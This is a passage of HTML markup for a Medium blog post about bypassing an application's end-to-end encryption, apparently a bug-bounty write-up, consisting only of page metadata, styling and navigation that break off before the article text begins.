<!doctype html><html lang="en"><head><title data-rh="true">Bypassing E2E encryption leads to multiple high vulnerabilities. | by Asem Eleraky | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2023-01-20T19:12:36.316Z"/><meta data-rh="true" name="title" content="Bypassing E2E encryption leads to multiple high vulnerabilities. | by Asem Eleraky | Medium"/><meta data-rh="true" property="og:title" content="Bypassing E2E encryption leads to multiple high vulnerabilities."/><meta data-rh="true" property="al:android:url" content="medium://p/65b708e5ad84"/><meta data-rh="true" property="al:ios:url" content="medium://p/65b708e5ad84"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="In today’s blog, I’m going to show you how I was able to bypass the E2E encryption of an application by analyzing an obfuscated javascript file that was imported to that application, and how this…"/><meta data-rh="true" property="og:description" content="In today’s blog, I’m going to show you how I was able to bypass the E2E encryption of an application by analyzing an obfuscated javascript…"/><meta data-rh="true" property="og:url" content="https://melotover.medium.com/bypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84"/><meta data-rh="true" property="al:web:url" content="https://melotover.medium.com/bypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/1*eeiaLlmgBLPYzTIIySTjTg.png"/><meta data-rh="true" property="article:author" content="https://melotover.medium.com"/><meta data-rh="true" name="author" content="Asem Eleraky"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="Bypassing E2E encryption leads to multiple high vulnerabilities."/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/65b708e5ad84"/><meta data-rh="true" property="twitter:description" content="In today’s blog, I’m going to show you how I was able to bypass the E2E encryption of an application by analyzing an obfuscated javascript…"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/1*eeiaLlmgBLPYzTIIySTjTg.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="9 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://melotover.medium.com"/><link data-rh="true" rel="canonical" href="https://melotover.medium.com/bypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/65b708e5ad84"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*eeiaLlmgBLPYzTIIySTjTg.png"],"url":"https:\u002F\u002Fmelotover.medium.com\u002Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84","dateCreated":"2023-01-20T19:12:36.316Z","datePublished":"2023-01-20T19:12:36.316Z","dateModified":"2023-02-04T15:40:40.425Z","headline":"Bypassing E2E encryption leads to multiple high vulnerabilities.","name":"Bypassing E2E encryption leads to multiple high vulnerabilities.","description":"In today’s blog, I’m going to show you how I was able to bypass the E2E encryption of an application by analyzing an obfuscated javascript file that was imported to that application, and how this…","identifier":"65b708e5ad84","author":{"@type":"Person","name":"Asem Eleraky","url":"https:\u002F\u002Fmelotover.medium.com"},"creator":["Asem Eleraky"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fmelotover.medium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fmelotover.medium.com\u002Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84"}</script><style type="text/css" data-fela-rehydration="574" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="574" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-bottom:2px}.ii{flex-wrap:nowrap}.ij{font-size:16px}.ik{line-height:24px}.im{margin:0 8px}.in{display:inline}.io{color:#1A8917}.ip{fill:#1A8917}.is{flex:0 0 auto}.iv{flex-wrap:wrap}.iw{padding-left:8px}.ix{padding-right:8px}.jy> *{flex-shrink:0}.jz{overflow-x:scroll}.ka::-webkit-scrollbar{display:none}.kb{scrollbar-width:none}.kc{-ms-overflow-style:none}.kd{width:74px}.ke{flex-direction:row}.kf{z-index:2}.kg{margin-right:4px}.kj{-webkit-user-select:none}.kk{border:0}.kl{fill:rgba(117, 117, 117, 1)}.ko{outline:0}.kp{user-select:none}.kq> svg{pointer-events:none}.kz{cursor:progress}.la{margin-left:4px}.lb{margin-top:0px}.lc{opacity:1}.ld{padding:4px 0}.lg{width:16px}.li{display:inline-flex}.lo{max-width:100%}.lp{padding:8px 2px}.lq svg{color:#6B6B6B}.mh{line-height:1.58}.mi{letter-spacing:-0.004em}.mj{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.ne{margin-bottom:-0.46em}.nf{line-height:1.18}.ng{letter-spacing:-0.022em}.nh{font-weight:600}.nx{margin-bottom:-0.31em}.od{margin-left:auto}.oe{margin-right:auto}.of{max-width:1227px}.ol{clear:both}.on{cursor:zoom-in}.oo{z-index:auto}.oq{height:auto}.or{max-width:1242px}.os{margin-top:10px}.ot{max-width:728px}.ow{padding:2px 4px}.ox{font-size:75%}.oy> strong{font-family:inherit}.oz{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.pa{max-width:1416px}.pb{max-width:1518px}.pc{margin-top:32px}.pd{margin-bottom:14px}.pe{padding-top:24px}.pf{padding-bottom:10px}.pg{background-color:#000000}.ph{height:3px}.pi{width:3px}.pj{margin-right:20px}.pk{max-width:1422px}.pl{text-decoration:underline}.pm{max-width:1467px}.pn{max-width:1184px}.po{max-width:1190px}.pp{max-width:1352px}.pq{max-width:1460px}.pr{max-width:1472px}.ps{max-width:1311px}.pt{overflow-x:auto}.pu{padding:32px}.pv{border:1px solid #E5E5E5}.pw{line-height:1.4}.px{margin-top:-0.2em}.py{margin-bottom:-0.2em}.pz{white-space:pre}.qa{min-width:fit-content}.qb{max-width:1378px}.qc{max-width:4380px}.qd{max-width:4321px}.qe{list-style-type:disc}.qf{margin-left:30px}.qg{padding-left:0px}.qm{max-width:1401px}.qn{max-width:1509px}.qo{max-width:1351px}.qp{max-width:1621px}.qq{max-width:1678px}.qr{margin-bottom:26px}.qs{margin-top:6px}.qt{margin-top:8px}.qu{margin-right:8px}.qv{padding:8px 16px}.qw{border-radius:100px}.qx{transition:background 300ms ease}.qz{white-space:nowrap}.ra{border-top:none}.rb{margin-bottom:50px}.rc{height:52px}.rd{max-height:52px}.re{box-sizing:content-box}.rf{position:static}.rg{z-index:1}.ri{max-width:155px}.ro{margin-bottom:64px}.sd{height:64px}.se{width:64px}.sf{align-self:flex-end}.sg{color:rgba(255, 255, 255, 1)}.sh{fill:rgba(255, 255, 255, 1)}.si{background:rgba(25, 25, 25, 1)}.sj{border-color:rgba(25, 25, 25, 1)}.sm:disabled{opacity:0.1}.sn:disabled:hover{background:rgba(25, 25, 25, 1)}.so:disabled:hover{border-color:rgba(25, 25, 25, 1)}.sp{flex:1 1 auto}.sv{padding-right:4px}.sw{font-weight:500}.td{white-space:pre-wrap}.te{margin-top:16px}.tk{height:0px}.ty{gap:18px}.tz{fill:rgba(61, 61, 61, 1)}.ub{padding-bottom:6px}.uc{border-bottom:1px solid #F2F2F2}.ui{fill:#242424}.uj{background:0}.uk{border-color:#242424}.ul:disabled:hover{color:#242424}.um:disabled:hover{fill:#242424}.un:disabled:hover{border-color:#242424}.uy{border-bottom:solid 1px #E5E5E5}.uz{margin-top:72px}.va{padding:24px 0}.vb{margin-bottom:0px}.vc{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.il:hover{text-decoration:underline}.iq:hover:not(:disabled){color:#156D12}.ir:hover:not(:disabled){fill:#156D12}.kn:hover{fill:rgba(8, 8, 8, 1)}.le:hover{fill:#000000}.lf:hover p{color:#000000}.lh:hover{color:#000000}.lr:hover svg{color:#000000}.qy:hover{background-color:#F2F2F2}.sc:hover{background-color:none}.sk:hover{background:#000000}.sl:hover{border-color:#242424}.ua:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.km:focus{fill:rgba(8, 8, 8, 1)}.ls:focus svg{color:#000000}.op:focus{transform:scale(1.01)}.kr:active{border-style:none}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:50px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jk{border-top:solid 1px #F2F2F2}.jl{border-bottom:solid 1px #F2F2F2}.jm{margin:32px 0 0}.jn{padding:3px 8px}.jw> *{margin-right:24px}.jx> :last-child{margin-right:0}.ky{margin-top:0px}.ln{margin:0}.na{font-size:20px}.nb{margin-top:2.14em}.nc{line-height:32px}.nd{letter-spacing:-0.003em}.nu{margin-top:1.72em}.nv{line-height:24px}.nw{letter-spacing:0}.oc{margin-top:0.94em}.ok{margin-top:56px}.ql{margin-top:1.14em}.rn{display:inline-block}.rp{flex-direction:row}.rs{margin-bottom:0}.rt{margin-right:20px}.sq{max-width:500px}.tj{margin-bottom:88px}.tv{font-size:24px}.tw{line-height:30px}.tx{letter-spacing:-0.016em}.uh{margin:40px 0 16px}.us{width:min-width}.ux{padding-top:72px}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.kx{margin-top:0px}.ou{margin-left:auto}.ov{text-align:center}.rm{display:inline-block}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.kw{margin-top:0px}.rl{display:inline-block}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.ku{margin-top:0px}.kv{margin-right:0px}.rk{display:inline-block}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:2px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.it{flex-direction:column}.iy{margin:24px -24px 0}.iz{padding:0}.jo> *{margin-right:8px}.jp> :last-child{margin-right:24px}.kh{margin-left:0px}.ks{margin-top:0px}.kt{margin-right:0px}.lj{margin:0}.lt{border:1px solid #F2F2F2}.lu{border-radius:99em}.lv{padding:0px 16px 0px 12px}.lw{height:38px}.lx{align-items:center}.lz svg{margin-right:8px}.mk{font-size:18px}.ml{margin-top:1.56em}.mm{line-height:28px}.mn{letter-spacing:-0.003em}.ni{font-size:16px}.nj{margin-top:1.23em}.nk{letter-spacing:0}.ny{margin-top:0.67em}.og{margin-top:40px}.qh{margin-top:1.34em}.rj{display:inline-block}.sa{margin-bottom:20px}.sb{margin-right:0}.su{max-width:100%}.sx{font-size:24px}.sy{line-height:30px}.sz{letter-spacing:-0.016em}.tf{margin-bottom:64px}.tl{font-size:20px}.tm{line-height:24px}.ud{margin:32px 0 16px}.uo{width:100%}.ut{padding-top:48px}.ly:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:50px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jg{border-top:solid 1px #F2F2F2}.jh{border-bottom:solid 1px #F2F2F2}.ji{margin:32px 0 0}.jj{padding:3px 8px}.ju> *{margin-right:24px}.jv> :last-child{margin-right:0}.lm{margin:0}.mw{font-size:20px}.mx{margin-top:2.14em}.my{line-height:32px}.mz{letter-spacing:-0.003em}.nr{margin-top:1.72em}.ns{line-height:24px}.nt{letter-spacing:0}.ob{margin-top:0.94em}.oj{margin-top:56px}.qk{margin-top:1.14em}.rq{flex-direction:row}.ru{margin-bottom:0}.rv{margin-right:20px}.sr{max-width:500px}.ti{margin-bottom:88px}.ts{font-size:24px}.tt{line-height:30px}.tu{letter-spacing:-0.016em}.ug{margin:40px 0 16px}.ur{width:min-width}.uw{padding-top:72px}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:50px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jc{border-top:solid 1px #F2F2F2}.jd{border-bottom:solid 1px #F2F2F2}.je{margin:32px 0 0}.jf{padding:3px 8px}.js> *{margin-right:24px}.jt> :last-child{margin-right:0}.ll{margin:0}.ms{font-size:20px}.mt{margin-top:2.14em}.mu{line-height:32px}.mv{letter-spacing:-0.003em}.no{margin-top:1.72em}.np{line-height:24px}.nq{letter-spacing:0}.oa{margin-top:0.94em}.oi{margin-top:56px}.qj{margin-top:1.14em}.rr{flex-direction:row}.rw{margin-bottom:0}.rx{margin-right:20px}.ss{max-width:500px}.th{margin-bottom:88px}.tp{font-size:24px}.tq{line-height:30px}.tr{letter-spacing:-0.016em}.uf{margin:40px 0 16px}.uq{width:min-width}.uv{padding-top:72px}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:2px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iu{flex-direction:column}.ja{margin:24px 0 0}.jb{padding:0}.jq> *{margin-right:8px}.jr> :last-child{margin-right:8px}.ki{margin-left:0px}.lk{margin:0}.ma{border:1px solid #F2F2F2}.mb{border-radius:99em}.mc{padding:0px 16px 0px 12px}.md{height:38px}.me{align-items:center}.mg svg{margin-right:8px}.mo{font-size:18px}.mp{margin-top:1.56em}.mq{line-height:28px}.mr{letter-spacing:-0.003em}.nl{font-size:16px}.nm{margin-top:1.23em}.nn{letter-spacing:0}.nz{margin-top:0.67em}.oh{margin-top:40px}.qi{margin-top:1.34em}.ry{margin-bottom:20px}.rz{margin-right:0}.st{max-width:100%}.ta{font-size:24px}.tb{line-height:30px}.tc{letter-spacing:-0.016em}.tg{margin-bottom:64px}.tn{font-size:20px}.to{line-height:24px}.ue{margin:32px 0 16px}.up{width:100%}.uu{padding-top:48px}.mf:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="print">.rh{display:none}</style><style type="text/css" data-fela-rehydration="574" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.om{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F65b708e5ad84&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 